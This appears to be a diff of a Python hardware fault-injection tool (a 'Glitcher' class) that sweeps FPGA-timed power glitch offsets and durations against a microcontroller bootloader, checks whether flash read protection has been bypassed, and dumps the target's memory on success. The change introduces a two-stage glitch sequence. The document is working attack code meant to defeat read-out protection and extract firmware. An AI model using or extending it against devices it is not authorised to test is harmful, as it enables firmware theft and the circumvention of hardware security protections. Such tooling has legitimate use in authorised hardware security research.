@@ -242,61 +242,60 @@ class Glitcher():
         print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)
 
     def run(self):
-        """Run the glitching process with two consecutive glitches per attempt"""
-    
+        """Run the glitching process with two different glitches per attempt"""
+
         start_time = datetime.now()
-    
-        # 假设 FPGA 时钟是 100 MHz → 10 ns/clk
         CLK_PERIOD_S = 10e-9
-        MARGIN_S     = 1e-6  # 加点额外时间，确保脉冲结束
-    
+        MARGIN_S     = 1e-6
+
         for offset in range(self.start_offset, self.end_offset, self.offset_step):
             for duration in range(self.start_duration, self.end_duration, self.duration_step):
                 for attempt in range(self.retries):
-    
+
                     print(fg.li_white +
                           f"[*] Test offset={offset}, duration={duration}, attempt={attempt+1}/{self.retries}"
                           + fg.rs)
-    
-                    # 1) 配置 offset/duration
-                    self.set_glitch_offset(offset)
-                    self.set_glitch_duration(duration)
-    
-                    # 2) 第一次 glitch：offset 周期后拉低电源
+
+                    # --- 第一段 glitch 参数 ---
+                    off1 = 0
+                    dur1 = 2_000_000
+                    self.set_glitch_offset(off1)
+                    self.set_glitch_duration(dur1)
                     self.start_glitch()
-                    # 等待 (offset + duration) 个周期 + margin
-                    sleep((offset + duration) * CLK_PERIOD_S + MARGIN_S)
-    
-                    # 3) 第二次 glitch：马上再来一次
-                    # 注意：FPGA 逻辑里 start_glitch 再次会重置计数器并重新计时
+                    # 用第一段参数计算等待
+                    sleep((off1 + dur1) * CLK_PERIOD_S + MARGIN_S)
+
+                    # --- 第二段 glitch 参数 ---
+                    off2 = offset
+                    dur2 = duration
+                    self.set_glitch_offset(off2)
+                    self.set_glitch_duration(dur2)
                     self.start_glitch()
-                    sleep((offset + duration) * CLK_PERIOD_S + MARGIN_S)
-    
-                    # 4) 等待目标跑到 bootloader，同步波特率
+                    # 用第二段参数计算等待
+                    sleep((off2 + dur2) * CLK_PERIOD_S + MARGIN_S)
+
+                    # 同步并检验
                     if not self.synchronize():
                         print(fg.li_red + "[-] Synchronization failed, retrying..." + fg.rs)
                         continue
-    
-                    # 5) 发送读 flash 检查命令
+
                     resp = self.send_target_command(READ_FLASH_CHECK, 1)
                     if isinstance(resp, list) and resp[0] == b"0":
                         end_time = datetime.now()
                         print(ef.bold + fg.green +
-                              "[*] Glitch success!\n"
-                              f"    offset={offset}, duration={duration}\n"
-                              f"    elapsed: {end_time - start_time}"
+                              f"[*] Glitch success! offset={offset}, duration={duration}, elapsed={end_time - start_time}"
                               + fg.rs)
-    
-                        # 记录并 dump
+
                         with open(RESULTS_FILE, "a") as f:
                             f.write(f"{offset},{duration},0,{resp[1].decode()}\n")
                         self.dump_memory()
                         return True
-    
+
                     elif isinstance(resp, list) and resp[0] != b"19":
                         print(fg.li_red + f"[?] Unexpected response: {resp}" + fg.rs)
-    
+
         return False
+
 
 
 def banner():
